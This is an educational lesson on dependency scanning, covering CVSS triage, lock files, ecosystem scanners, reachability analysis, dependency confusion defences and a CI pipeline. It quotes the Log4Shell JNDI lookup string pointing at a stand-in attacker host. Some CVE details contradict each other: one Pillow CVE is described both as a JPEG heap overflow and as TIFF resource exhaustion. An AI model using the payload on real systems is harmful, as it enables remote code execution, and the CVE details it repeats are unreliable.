Dependency
Scanning

Modern applications are mostly other people's code. The average Python project pulls in 150 transitive dependencies; a typical Node.js app can have thousands. Each one is a potential vulnerability. Dependency scanning — also called Software Composition Analysis (SCA) — is the practice of continuously checking every package in your dependency tree against CVE databases, and acting on what you find. This lesson covers the full picture: how dependency graphs work, every major ecosystem scanner, reachability analysis, dependency confusion attacks, license compliance, and a complete automated pipeline.

🟢 Beginner — Understanding Dependencies
Direct dependencies, transitive dependencies, and how vulnerabilities reach you
Before you can scan dependencies, you need to understand what you're scanning: the full dependency graph, not just the packages you explicitly installed.

When you add Django==4.2.0 to your requirements.txt, you get Django. But Django itself depends on sqlparse and asgiref. Those packages have their own dependencies. By the time the full graph resolves, a single direct dependency can pull in dozens of transitive ones — each of which can carry CVEs you never knowingly chose to include.

⚠️
Log4Shell (CVE-2021-44228): The most destructive dependency vulnerability in recent history. Log4j was a transitive dependency in thousands of applications — teams had no idea they were using it. CVSS 10.0. Remote code execution with a single HTTP request containing ${jndi:ldap://attacker.com/exploit} in any logged field (User-Agent, username, even error messages). Exploited within hours of disclosure. The lesson: you are responsible for every package in your dependency tree, not just the ones you installed directly.

CVSS scoring — reading a vulnerability report correctly
What CVSS 3.1 scores mean and why raw score is not the only number that matters
▼
Score rangeSeverityExampleTypical SLA
9.0 – 10.0CRITICALLog4Shell (10.0): unauthenticated RCE via networkFix within 24–72 hours
7.0 – 8.9HIGHPillow heap overflow: RCE parsing malicious imagesFix within 7 days
4.0 – 6.9MEDIUMDjango path traversal: read arbitrary files if DEBUG=TrueFix within 30 days
0.1 – 3.9LOWcertifi: outdated CA bundle (no active exploit)Fix in next regular release

Why raw CVSS score is not enough

CVSS measures the theoretical severity of a vulnerability in isolation. Your actual risk depends on context. A CVSS 9.8 vulnerability in a package you use only in a background task that never processes user input may be less urgent than a CVSS 6.5 vulnerability in your authentication library. Always consider: is the vulnerable code path actually reachable? Does your deployment model expose the attack vector? Is there a compensating control?

# CVSS 3.1 vector breakdown for Log4Shell:
# CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
#
# AV:N  = Attack Vector Network     → exploitable over the internet
# AC:L  = Attack Complexity Low     → no special conditions needed
# PR:N  = Privileges Required None  → unauthenticated attacker
# UI:N  = User Interaction None     → fully automated exploit possible
# S:C   = Scope Changed             → impact beyond vulnerable component
# C:H   = Confidentiality High      → full data disclosure
# I:H   = Integrity High            → full data modification
# A:H   = Availability High         → complete denial of service
# = 10.0 CRITICAL
#
# Contrast: CVSS 7.5 with AV:N but PR:H (requires admin access)
# High score, but much harder to exploit in practice
Lock files — why you scan the lock file, not the manifest
requirements.txt vs requirements.lock, package.json vs package-lock.json
▼

Your manifest file (requirements.txt, package.json) specifies your direct dependencies and version ranges. Your lock file (requirements.lock, package-lock.json, poetry.lock) records the exact resolved version of every package in the full transitive tree. Scanning the manifest misses transitive vulnerabilities. Always scan the lock file.

# requirements.txt (manifest): specifies ranges, direct deps only
django>=4.0,<5.0    # ← which version of urllib3 does this resolve to?
requests             # ← no version pin at all

# requirements.lock (lock file): every package, exact version, hash
Django==4.2.3 \
    --hash=sha256:a29e...  # cryptographically verified exact version
urllib3==2.0.4 \           # transitive dep, exact version locked
    --hash=sha256:bce8...

# Scan the LOCK FILE — it has the full resolved tree
$ pip-audit -r requirements.lock   # scans all 47 packages
$ pip-audit -r requirements.txt    # only scans your 3 direct deps

# npm: scan package-lock.json, not package.json
$ npm audit                        # reads package-lock.json automatically

# Poetry: scan poetry.lock
$ pip-audit --requirement poetry.lock

# Go: go.sum is the lock file (scanned by govulncheck)
$ govulncheck ./...
💡
Commit your lock file: Lock files belong in version control. They give reproducible builds, make dependency updates explicit and reviewable in PRs, and enable accurate security scanning. Developers who add lock files to .gitignore are causing unnecessary security and reproducibility problems.

pip-audit is the canonical Python dependency scanner, maintained by the Python Packaging Authority (PyPA). It queries both PyPI Advisory Database and OSV (Open Source Vulnerabilities). Fast, accurate, integrates directly with pip. Free, open source.

Python — pip-audit
# Install
$ pip install pip-audit

# Scan current environment
$ pip-audit

# Scan a requirements file (use lock file for full coverage)
$ pip-audit -r requirements.lock

# JSON output for CI/CD parsing
$ pip-audit -r requirements.lock --format json -o pip-audit.json

# Ignore a specific CVE with documented reason
$ pip-audit -r requirements.lock \
    --ignore-vuln GHSA-j3f7-7rmc-6wqj  # false positive: only affects Windows

# Fix: auto-upgrade packages to patched versions
$ pip-audit -r requirements.txt --fix
# Rewrites requirements.txt with minimum patched versions

# Parse results in CI:
import json, sys
data = json.load(open('pip-audit.json'))
vulns = [v for dep in data['dependencies']
         for v in dep['vulns']
         if v.get('fix_versions')]   # only fixable vulns
if vulns:
    for v in vulns:
        print(f"  {v['id']}: {v['description'][:80]}")
    sys.exit(1)

npm audit is the built-in Node.js vulnerability scanner, querying the npm security advisory database. For additional coverage, Snyk and audit-ci add severity filtering and CI-specific exit codes. Yarn and pnpm have equivalent audit commands.

Node.js — npm audit
# Run npm audit (reads package-lock.json)
$ npm audit

# JSON output
$ npm audit --json > npm-audit.json

# Only fail CI on high/critical (not moderate/low)
$ npm audit --audit-level=high
# Exit code 1 only if HIGH or CRITICAL vulns found

# Auto-fix compatible updates
$ npm audit fix
# Upgrades to semver-compatible patched versions
# NEVER run npm audit fix --force in production (breaks semver)

# Yarn
$ yarn audit --level high

# pnpm
$ pnpm audit --audit-level high

# audit-ci: better CI integration with config file
$ npm install -g audit-ci
$ cat .audit-ci.json
{
  "high": true,           // fail on high and critical
  "allowlist": [
    "GHSA-wrvr-8mpx-r7pp"  // known false positive
  ]
}
$ audit-ci --config .audit-ci.json

# Parse npm audit JSON in CI:
HIGH=$(cat npm-audit.json | python3 -c "
import json,sys
d=json.load(sys.stdin)
vulns=d.get('vulnerabilities',{})
count=sum(1 for v in vulns.values()
         if v.get('severity') in ['high','critical'])
print(count)")
[ "$HIGH" -eq "0" ] || { echo "HIGH/CRITICAL npm vulns: $HIGH"; exit 1; }

govulncheck is the official Go vulnerability scanner from the Go team at Google. Unlike other scanners that report any CVE in any imported package, govulncheck performs call graph analysis — it only reports vulnerabilities in code your program actually calls. This dramatically reduces false positives.

Go — govulncheck
# Install
$ go install golang.org/x/vuln/cmd/govulncheck@latest

# Scan all packages in module
$ govulncheck ./...

# Example output:
Vulnerability #1: GO-2023-1840
    Incorrect sanitisation of "/" in net/http
    More info: https://pkg.go.dev/vuln/GO-2023-1840
    Module: stdlib
    Found in: net/http@go1.20.3
    Fixed in: go1.20.7
    Call stacks in your code:
        main.go:42:14 main.handleRequest
            net/http.Redirect     # ← actual call in YOUR code

# govulncheck only reports this because your code calls http.Redirect
# A different CVE in the same package that your code never calls
# would NOT be reported. This is reachability analysis built-in.

# JSON output for CI parsing
$ govulncheck -json ./... > govuln.json

# GitHub Actions:
- name: govulncheck
  uses: golang/govulncheck-action@v1
  with:
    go-version-input: stable
    check-latest: true

bundler-audit is the standard Ruby gem vulnerability scanner. It checks your Gemfile.lock against the Ruby Advisory Database. bundle-audit also detects insecure gem sources (HTTP not HTTPS) and unpatched gems.

Ruby — bundler-audit
# Install
$ gem install bundler-audit

# Update advisory database (always do this first)
$ bundle-audit update

# Scan Gemfile.lock
$ bundle-audit check

# Example output:
Name: actionpack
Version: 7.0.4
Advisory: CVE-2023-22795
Criticality: High
URL: https://github.com/advisories/GHSA-8xww-x3g3-6jcv
Title: ReDoS in Action Dispatch header parsing
Solution: upgrade to >= 7.0.6.1

# Ignore a specific CVE
$ bundle-audit check --ignore CVE-2023-22795

# Fail CI only on high/critical
$ bundle-audit check
# Exit code 1 if ANY vulnerability found (filter in script)
$ bundle-audit check --format json | python3 -c "
import json,sys
data=json.load(sys.stdin)
crit=[r for r in data.get('results',[])
      if r.get('criticality') in ['High','Critical']]
sys.exit(1 if crit else 0)"

# GitHub Actions
- run: |
    gem install bundler-audit
    bundle-audit update
    bundle-audit check

OWASP Dependency-Check

🔴 Advanced — Reachability Analysis
Not every CVE in your dependency tree is exploitable
Reachability analysis answers the question that raw CVE counts cannot: does your application actually execute the vulnerable code path? This is the difference between a real vulnerability and noise.
📌
The reachability gap: A typical enterprise Python application has 150+ dependencies. A raw CVE scan will find 20-50 CVEs. Reachability analysis typically shows that only 3-8 of those have vulnerable code paths that your application actually invokes. Fixing 8 real issues instead of chasing 50 noisy ones is the operational difference reachability makes. But: "not reachable" is not the same as "safe" — code paths can change, and reachability analysis is a risk-reduction tool, not a suppression justification.
How reachability analysis works
Call graph analysis from your code to the vulnerable function
▼
# Example: Pillow (Python imaging library) has a heap overflow CVE
# in PIL.JpegImagePlugin._getmp() when parsing JPEG files
#
# Without reachability analysis:
# "You have Pillow 9.5.0. CVE-2023-44271 is HIGH. Fix immediately."
#
# With reachability analysis:
# "CVE-2023-44271 is in PIL.JpegImagePlugin._getmp()
#  Scanning your codebase for calls to Pillow functions..."
#
# Your code:
from PIL import Image
def make_thumbnail(url: str):
    img = Image.open(requests.get(url, stream=True).raw)
    img.thumbnail((200, 200))
    return img
#
# Reachability check: does your code call PIL.JpegImagePlugin._getmp()?
# Image.open() with a JPEG DOES call _getmp() internally.
# AND your code opens user-supplied URLs (user-controlled input).
# Result: REACHABLE. Priority: HIGH. Fix urgently.
#
# But if your code was:
from PIL import Image
def resize_internal_asset(path: str):
    img = Image.open(path)        # only ever opens trusted internal PNGs
    img = img.convert('RGB')
    return img
#
# JPEG plugin never called. Input not user-controlled.
# Result: NOT REACHABLE via current code paths.
# Action: still upgrade, but not an emergency blocker.

🔴 Advanced — Dependency Confusion Attacks
When attackers publish malicious packages with your private package names
Dependency confusion is a supply chain attack that exploits how package managers resolve public vs private packages. Understanding it is essential for any team using private registries.
How dependency confusion works — and three ways to stop it
Discovered by Alex Birsan in 2021, affected Apple, Microsoft, Tesla, and 35+ companies
▼

Companies maintain private package registries (npm, PyPI, Artifactory) for internal packages. Package managers by default check public registries too. If a company has a private package called mycompany-utils and an attacker publishes a package with the same name to public PyPI or npmjs.com with a higher version number, the package manager may prefer the public (malicious) version. Alex Birsan found this affected 35+ major companies in 2021 and collected over $130,000 in bug bounties.

# The attack:
# 1. Attacker finds your internal package name (from job postings,
#    GitHub leak, requirements.txt in public repo, error messages)
# 2. Publishes malicious package with same name on public PyPI
#    with version 9999.0.0 (higher than your internal version)
# 3. Your pip install --extra-index-url https://private.reg/simple
#    resolves to public PyPI version 9999.0.0 (higher version wins)
# 4. Malicious package executes on install, data exfiltration begins

# ── Fix 1: Use --index-url, not --extra-index-url ────────────────
# --extra-index-url checks BOTH registries and takes highest version
pip install --extra-index-url https://private.reg/simple mycompany-utils
# --index-url REPLACES the default registry (no public fallback)
pip install --index-url https://private.reg/simple mycompany-utils

# ── Fix 2: Namespace your private packages ───────────────────────
# Public PyPI has no package called @mycompany/utils (scoped names)
# npm: use scoped packages
@mycompany/utils   # scoped to @mycompany namespace
# PyPI: use organisation prefix
mycompany-utils-internal  # unlikely to be registered on public PyPI

# ── Fix 3: Register your package names on public PyPI/npm ─────────
# Publish placeholder packages to "claim" the name
# Placeholder has no code, just a README explaining it's internal
# Attacker can no longer register the same name

# ── Fix 4: Artifactory virtual repos with priority ─────────────────
# Artifactory can be configured so local/private repo has priority
# over proxied public repo, regardless of version numbers

# ── Fix 5: Hash pinning in requirements.txt ─────────────────────
mycompany-utils==2.1.0 \
    --hash=sha256:abc123...   # only this exact hash is accepted
# Even if attacker publishes version 2.1.0 to public PyPI,
# the hash won't match → install rejected
Supply chain attackUse --index-url not --extra-index-urlNamespace packagesHash pin

🔴 Advanced — Full Automated Pipeline
Complete dependency scanning pipeline with GitHub Actions and Dependabot
Two complementary mechanisms: Dependabot handles continuous monitoring and automated PRs, while CI scanning gates every PR against new introductions.
Dependabot — automatic dependency update PRs
GitHub-native continuous monitoring that opens PRs when vulnerabilities are found
▼
.github/dependabot.yml
version: 2
updates:
  # Python dependencies
  - package-ecosystem: pip
    directory: /
    schedule:
      interval: weekly
      day: monday
      time: "09:00"
      timezone: UTC
    open-pull-requests-limit: 10
    reviewers: [security-team]
    labels: [dependencies, security]
    # Group minor/patch updates to reduce PR noise
    groups:
      python-minor:
        patterns: ["*"]
        update-types: ["minor", "patch"]

  # Node.js dependencies
  - package-ecosystem: npm
    directory: /frontend
    schedule: { interval: weekly }
    open-pull-requests-limit: 10

  # GitHub Actions versions
  - package-ecosystem: github-actions
    directory: /
    schedule: { interval: weekly }

  # Docker base images
  - package-ecosystem: docker
    directory: /
    schedule: { interval: weekly }

Knowledge Check
Dependency scanning interview questions
Questions that come up regularly in AppSec engineer and DevSecOps interviews.
Q1. Your dependency scanner reports a CVSS 9.8 CRITICAL vulnerability in a transitive dependency. A developer says "we don't call that library directly so we don't need to fix it." How do you respond?
The developer is correct — if the code is not called directly, the vulnerability is not exploitable
The developer is correct, but it's good practice to fix it anyway when convenient
The developer is partly right that reachability matters, but "not called directly" is not the same as "not reachable." You need to verify: (1) Is the vulnerable function in the transitive dep's call path when your direct dep uses it? (2) Is user input involved in that call path? (3) Can the code path change? The appropriate response is to run reachability analysis, document the assessment, and still upgrade the transitive dep when a fix is available — because transitive deps are your responsibility regardless.
Escalate to the CISO immediately — all CRITICAL CVEs must be fixed within 24 hours with no exceptions
The developer is making a common mistake: conflating "not called directly by us" with "not reachable." A transitive dependency is called transitively — through the direct dependency. The question is whether the direct dependency's usage in your code eventually calls the vulnerable function. This requires actual call graph analysis, not just checking whether you import the transitive package directly. Additionally: even if genuinely not reachable today, code changes tomorrow. Maintaining a policy of "fix transitive CVEs when they have available patches" is the correct posture, with reachability analysis informing priority and SLA rather than suppression.
Q2. Explain the dependency confusion attack. What is the specific technical reason it works, and what is the single most important configuration fix?
An attacker typosquats a popular package name (e.g. "reqests" instead of "requests") hoping developers mistype it
An attacker compromises the maintainer account of a popular package and pushes a malicious update
An attacker registers a package on the public registry (PyPI, npmjs) with the same name as your internal private package, but with a higher version number. When pip or npm is configured with --extra-index-url, it checks both the private and public registry and selects the highest available version. The attacker's version 9999.0.0 wins over your internal 1.2.3. The single most important fix: use --index-url instead of --extra-index-url, which makes the private registry the only source with no public fallback. Also: namespace your private packages and register placeholder packages on public registries.
An attacker injects malicious code into a legitimate package during the build and publish pipeline of a popular open source project
Dependency confusion (discovered by Alex Birsan in 2021) exploits a specific behaviour of pip, npm, and similar tools when configured with multiple registries. The extra-index-url behaviour treats all configured registries equally and selects the highest version number from any of them. An attacker who knows your internal package name (from a leaked requirements.txt, job posting, or GitHub error log) publishes a malicious package with the same name on the public registry with version 99999.0.0. Your build system picks it over your internal v1.2.3. The --index-url flag solves this by replacing the default registry entirely, so only your private registry is consulted. Namespace prefixes and claiming public package names are defence in depth.
Q3. Why should you scan the lock file (requirements.lock, package-lock.json) rather than the manifest (requirements.txt, package.json) for vulnerabilities?
Lock files are more recent so they have up-to-date version information
Manifests cannot be parsed by most scanners; lock files use a standardised format
The manifest lists only your direct dependencies and often uses version ranges rather than exact versions. The lock file records the exact resolved version of every package in the full transitive dependency tree. Scanning only the manifest misses all transitive vulnerabilities — which is where Log4Shell, the most damaging recent supply chain vulnerability, lived for thousands of applications. The lock file is the ground truth of what is actually installed.
Lock files include hash verification so the scanner can confirm integrity
This is the most operationally important concept in dependency scanning. The manifest is your shopping list; the lock file is the receipt of what you actually got, including everything that came in as a dependency of a dependency. Log4Shell is the canonical example: the affected applications had no direct dependency on log4j. It arrived as a transitive dependency, sometimes 4-5 hops deep in the dependency tree. Organisations that scanned only their manifests had no idea log4j was in their stack. The lock file is the complete picture. Always scan the lock file. Always commit the lock file to version control.

Model Answer — Part 1: Finding Triage

F1 — PyYAML CVE-2022-1471 (CVSS 9.8): LOW URGENCY
This CVE affects yaml.load() with FullLoader when processing untrusted input. Your codebase uses yaml.safe_load() exclusively. safe_load() does not allow arbitrary Python object instantiation and is not vulnerable to this CVE. The reachability analysis is clear: the vulnerable code path is not called. Action: upgrade PyYAML to a patched version in the next scheduled release cycle (it costs nothing to upgrade), but this is not a blocker or emergency. Document the assessment in your suppression file with the reasoning. Add a Semgrep rule to alert if yaml.load() is introduced in future code.

F2 — Django CVE-2023-41164 (CVSS 7.5): INVESTIGATE + LOW URGENCY
Two signals point to low urgency: (1) your app does not use Django i18n, making the vulnerable code path unreachable in your deployment, and (2) pip-audit reports no fix_versions, suggesting this may be disputed or the advisory is not yet in pip-audit's database. Action: check the Django security advisory directly to confirm the CVE status. If confirmed as affecting django.utils.translation and your app truly never calls translation functions, document as low-priority. Schedule upgrade to Django 4.2.6 in the next regular sprint. If dispute is confirmed, add to suppression file with link to Django's advisory.

F3 — Pillow CVE-2023-44271 (CVSS 7.5): HIGH URGENCY, BLOCK DEPLOY
This is the most urgent finding. The vulnerability is in TIFF image processing. Your app accepts user image uploads and processes them with Pillow. User-controlled input flows directly to the vulnerable code path. An attacker can upload a crafted TIFF and cause resource exhaustion, potentially taking down your service. A fix is available (Pillow 10.0.1). Action: treat as HIGH priority. Fix within 7 days, or immediately if deploy cadence allows. Add an input validation gate (only accept JPEG/PNG/WebP, reject TIFF) as a compensating control while upgrade is in progress. This is the canonical case for acting on a finding despite a modest 7.5 CVSS score: user input + vulnerable code path + available fix = fix now.

F4 — cryptography CVE-2023-49083 (CVSS 4.0): LOW URGENCY
The vulnerability is in PKCS12 parsing. Your app uses the cryptography library only for JWT signing with RSA keys (which uses the RSA and serialization modules, not PKCS12). The vulnerable function is not in your code's call path. Additionally, CVSS 4.0 indicates limited impact even when exploitable. A fix is available and cheap to apply. Action: upgrade to cryptography 41.0.6 in the next regular release. No emergency. Document the reachability assessment. Note: even though not reachable now, upgrading is always correct when a fix is available — the code path could change.

F5 — certifi CVE-2023-37920 (CVSS 9.8): MEDIUM-HIGH URGENCY
Despite the CVSS 9.8 score, this CVE has a specific and context-dependent nature: certifi removed trust for certain root CA certificates that were previously trusted. If those CAs issued certificates used by your third-party API endpoints, your HTTPS calls could fail after upgrade (not before). The risk of NOT upgrading: if those distrusted CAs were distrusted for good reason (compromise or policy violation), you may be trusting fraudulent certificates. Action: upgrade certifi promptly (within 7 days), but test your HTTPS calls to all third-party APIs in staging first to ensure none use the affected CA certificates. This is a case where the fix could cause breakage, so test before deploying to production.

Part 2 — 20-Repository Programme Design

Tools: pip-audit for Python, npm audit + audit-ci for Node.js, OWASP Dependency-Check for Java (handles Maven/Gradle). Snyk as the unified dashboard for continuous monitoring across all ecosystems. Dependabot for automated update PRs on all 20 repos.

Rollout order: Week 1-2: Enable GitHub Dependabot security alerts on all 20 repos (zero effort, free, immediate vulnerability visibility). Enable Snyk monitor on all 20 repos in monitor-only mode to baseline current state. Week 3-4: Add pip-audit and npm audit to CI in warn-only mode for all repos. Generate baseline report: how many HIGH/CRITICAL fixable vulns across the 20 repos. Week 5-8: Work through the baseline backlog with development teams. Fix all CRITICAL fixable vulns first, then HIGH. Week 9-10: Switch CI scanning from warn-only to blocking for CRITICAL. Week 11-12: Switch to blocking for HIGH.

CI gate policy: Block on CRITICAL vulnerabilities with available fix versions (zero tolerance). Block on HIGH vulnerabilities with available fix versions (SLA: 7 days from detection). Warn on MEDIUM (SLA: 30 days). No action required on LOW unless fix is trivial. Scheduled daily scan in addition to PR gate (catches newly published CVEs in existing deps). License compliance gate: block if GPL/AGPL found in repositories with proprietary code.

Remediation SLAs: CRITICAL fixable: 72 hours. HIGH fixable: 7 days. MEDIUM: 30 days. LOW: next regular release cycle. CRITICAL with no fix available: document, add compensating control, rescan weekly. Reporting: weekly email to engineering leads with open findings count by severity and age.
